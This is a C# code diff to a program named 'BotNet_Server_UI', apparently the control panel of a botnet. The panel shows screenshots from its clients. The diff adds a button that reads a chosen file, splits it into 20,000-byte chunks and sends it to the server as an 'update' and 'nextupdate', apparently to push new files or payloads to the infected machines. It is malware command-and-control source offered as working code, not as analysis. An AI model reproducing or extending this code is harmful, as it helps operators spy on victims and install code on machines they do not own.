@@ -13,6 +13,7 @@ using System.Windows.Media;
 using System.Windows.Threading;
 using System.Configuration;
 using CommandsLibrary;
+using System.IO;
 
 namespace BotNet_Server_UI
 {
@@ -504,13 +505,96 @@ namespace BotNet_Server_UI
             }
         }
 
-        private void Button_Click1(object sender, RoutedEventArgs e)
+        private async void Button_Click1(object sender, RoutedEventArgs e)
         {
             try
             {
-                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow ScreenClick event) Открываю окно списка клиентов со скриншотами\r\n";
-                Screens screenwindow = new Screens();
-                screenwindow.Show();
+                foreach (var item in m3md2.WinHelper.FindVisualChildren<Button>(Grid))
+                {
+                    if ((string)item.Content == "Открыть скриншот панель")
+                    {
+                        m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow ScreenClick event) Открываю окно списка клиентов со скриншотами\r\n";
+                        Screens screenwindow = new Screens();
+                        screenwindow.Show();
+                    }
+                    else if ((string)item.Content == "Загрузить файл")
+                    {
+                        foreach (var window in Application.Current.Windows)
+                        {
+                            if (window is IPSet)
+                            {
+                                (window as IPSet).isSendFrom = false;
+                            }
+                        }
+                        Command.IsEnabled = false;
+                        SendButton.IsEnabled = false; 
+                        item.IsEnabled = false;
+                        m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow DownloadClick event) Открываю окно загрузки файла\r\n";
+                        byte[] fileContent = new byte[0];
+                        var filePath = string.Empty;
+                        var fileName = string.Empty;
+                        using (System.Windows.Forms.OpenFileDialog openFileDialog = new System.Windows.Forms.OpenFileDialog())
+                        {
+                            openFileDialog.InitialDirectory = "c:\\";
+                            openFileDialog.Filter = "All files (*.*)|*.*";
+                            openFileDialog.FilterIndex = 1;
+                            openFileDialog.RestoreDirectory = true;
+
+                            if (openFileDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                            {
+                                //Get the path of specified file
+                                filePath = openFileDialog.FileName;
+                                fileName = openFileDialog.FileName.Split('\\').LastOrDefault();
+                                //Read the bytes
+                                fileContent = File.ReadAllBytes(filePath);
+                            }
+                        }
+                        List<byte[]> btlist = new List<byte[]>();
+                        int value = 0;
+                        for (int i = 0; i < Math.Ceiling(fileContent.Length / 20000d); i++)//bt это исходный массив байтов
+                        {
+                            if (fileContent.Length - value > 20000)
+                            {
+                                byte[] btt = new byte[20000];
+                                btlist.Add(btt);
+                                Array.ConstrainedCopy(fileContent, value, btlist[i], 0, 20000);//копирует элементы одного массива в другой, с указанием начального индекса и количества элементов для копирования
+                                value += 20000;//счетчик, сколько байтов уже отсчитано
+                            }
+                            else
+                            {
+                                byte[] btt = new byte[fileContent.Length - value];
+                                btlist.Add(btt);
+                                Array.ConstrainedCopy(fileContent, value, btlist[i], 0, fileContent.Length - value);
+                            }
+                        }
+                        bool isFirstIter = true;
+                        int j = 0;
+                        item.Content = $"Загрузить файл ({j++}/{btlist.Count})";
+                        item.IsEnabled = true;
+                        foreach (var bytearray in btlist)
+                        {
+                            if (isFirstIter)
+                            {
+                                UpdateFile file = new UpdateFile()
+                                {
+                                    filename = fileName,
+                                    filebytes = bytearray
+                                };
+                                _ = await ApiRequest.CreateProductAsync(file, "update");
+                                isFirstIter = false;
+                                item.Content = $"Загрузить файл ({j++}/{btlist.Count})";
+                                continue;
+                            }
+                            UpdateFile file1 = new UpdateFile()
+                            { filebytes = bytearray};
+                            _ = await ApiRequest.CreateProductAsync(file1, "nextupdate");
+                            item.Content = $"Загрузить файл ({j++}/{btlist.Count})";
+                        }
+                        item.Content = "Загрузить файл";
+                        Command.IsEnabled = true;
+                        SendButton.IsEnabled = true;
+                    }
+                }
             }
             catch (Exception ex)
             {
